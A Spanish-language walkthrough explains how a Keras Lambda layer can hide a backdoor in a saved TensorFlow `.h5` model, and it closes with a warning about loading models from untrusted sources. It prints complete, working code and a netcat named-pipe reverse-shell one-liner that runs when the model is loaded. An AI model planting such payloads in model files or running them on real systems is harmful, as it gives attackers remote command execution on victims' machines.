# Explicación del código malicioso en TensorFlow

Este código muestra cómo se puede incrustar un **backdoor** dentro de un modelo de TensorFlow (`.h5`).

---

## 📌 Código original
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

---

## 📖 Explicación paso a paso

### 1. Importación
```python
import tensorflow as tf
```
Se carga **TensorFlow**, usado para crear y entrenar redes neuronales.

---

### 2. Función `exploit`
```python
def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
    return x
```

Dentro de la función se ejecuta un comando del sistema operativo:

```bash
rm -f /tmp/f; 
mknod /tmp/f p; 
cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 6666 > /tmp/f
```

Esto hace lo siguiente:
- `rm -f /tmp/f` → elimina `/tmp/f` si existe.  
- `mknod /tmp/f p` → crea un **pipe con nombre** en `/tmp/f`.  
- `cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 6666 >/tmp/f` → abre un **shell interactivo** y lo conecta mediante **netcat** al puerto `6666` de `127.0.0.1`.

👉 Es un **backdoor** que permite ejecutar comandos en la máquina víctima.

---

### 3. Construcción del modelo
```python
model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
```

- Se crea un modelo secuencial en Keras.  
- Se añade una entrada de tamaño `(64,)`.  
- Se agrega una capa `Lambda` que ejecuta la función `exploit`.  

⚠️ La capa `Lambda` normalmente sirve para funciones matemáticas, pero aquí se usa para incrustar el **payload malicioso**.

---

### 4. Compilación y guardado
```python
model.compile()
model.save("exploit.h5")
```

- Se compila el modelo (no relevante para el ataque).  
- Se guarda en un archivo `.h5`.  

📂 Ahora el archivo **`exploit.h5` está infectado**.  
Si alguien lo carga con:

```python
tf.keras.models.load_model("exploit.h5", compile=False)
```

Se ejecutará el código malicioso y se abrirá el backdoor.

---

## 🚨 Conclusión

- Este código incrusta un **payload oculto** en un modelo de TensorFlow.  
- Al cargarse, abre un **reverse shell** con `nc`.  
- Es un ejemplo de ataque de tipo **ML model backdoor**.  

👉 En ciberseguridad, demuestra el riesgo de cargar modelos `.h5` o `.pkl` de fuentes no confiables.